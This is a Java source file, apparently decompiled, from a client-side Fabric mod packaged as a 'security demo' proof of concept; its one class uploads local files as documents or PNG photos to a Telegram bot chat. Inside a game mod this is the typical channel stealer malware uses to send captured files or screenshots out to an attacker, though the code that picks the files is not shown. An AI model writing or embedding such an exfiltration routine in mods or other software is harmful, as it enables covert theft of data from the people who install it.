package com.securitydemo.poc;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;

@Environment(EnvType.CLIENT)
final class TelegramSender {
   private TelegramSender() {
   }

   static void sendDocument(String botToken, String chatId, Path file, String caption) throws IOException {
      String boundary = "----SecurityDemoPoC" + System.currentTimeMillis();
      String url = "https://api.telegram.org/bot" + botToken + "/sendDocument";
      HttpURLConnection connection = (HttpURLConnection)URI.create(url).toURL().openConnection();
      connection.setRequestMethod("POST");
      connection.setDoOutput(true);
      connection.setConnectTimeout(15000);
      connection.setReadTimeout(30000);
      connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
      byte[] fileBytes = Files.readAllBytes(file);
      String fileName = file.getFileName().toString();
      OutputStream out = connection.getOutputStream();

      try {
         writeField(out, boundary, "chat_id", chatId);
         if (caption != null && !Compat.isBlank(caption)) {
            writeField(out, boundary, "caption", caption);
         }

         writeFile(out, boundary, "document", fileName, "text/plain", fileBytes);
         out.write(("--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
      } catch (Throwable var13) {
         if (out != null) {
            try {
               out.close();
            } catch (Throwable var12) {
               var13.addSuppressed(var12);
            }
         }

         throw var13;
      }

      if (out != null) {
         out.close();
      }

      int code = connection.getResponseCode();
      if (code < 200 || code >= 300) {
         throw new IOException("Telegram API HTTP " + code);
      }
   }

   static void sendPhoto(String botToken, String chatId, Path file, String caption) throws IOException {
      String boundary = "----SecurityDemoPoC" + System.currentTimeMillis();
      String url = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
      HttpURLConnection connection = (HttpURLConnection)URI.create(url).toURL().openConnection();
      connection.setRequestMethod("POST");
      connection.setDoOutput(true);
      connection.setConnectTimeout(15000);
      connection.setReadTimeout(30000);
      connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
      byte[] fileBytes = Files.readAllBytes(file);
      String fileName = file.getFileName().toString();
      OutputStream out = connection.getOutputStream();

      try {
         writeField(out, boundary, "chat_id", chatId);
         if (caption != null && !Compat.isBlank(caption)) {
            writeField(out, boundary, "caption", caption);
         }

         writeFile(out, boundary, "photo", fileName, "image/png", fileBytes);
         out.write(("--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
      } catch (Throwable var13) {
         if (out != null) {
            try {
               out.close();
            } catch (Throwable var12) {
               var13.addSuppressed(var12);
            }
         }

         throw var13;
      }

      if (out != null) {
         out.close();
      }

      int code = connection.getResponseCode();
      if (code < 200 || code >= 300) {
         throw new IOException("Telegram API HTTP " + code);
      }
   }

   private static void writeField(OutputStream out, String boundary, String name, String value) throws IOException {
      out.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
      out.write(("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n").getBytes(StandardCharsets.UTF_8));
      out.write((value + "\r\n").getBytes(StandardCharsets.UTF_8));
   }

   private static void writeFile(OutputStream out, String boundary, String fieldName, String fileName, String contentType, byte[] data) throws IOException {
      out.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
      out.write(("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + fileName + "\"\r\n").getBytes(StandardCharsets.UTF_8));
      out.write(("Content-Type: " + contentType + "\r\n\r\n").getBytes(StandardCharsets.UTF_8));
      out.write(data);
      out.write("\r\n".getBytes(StandardCharsets.UTF_8));
   }
}
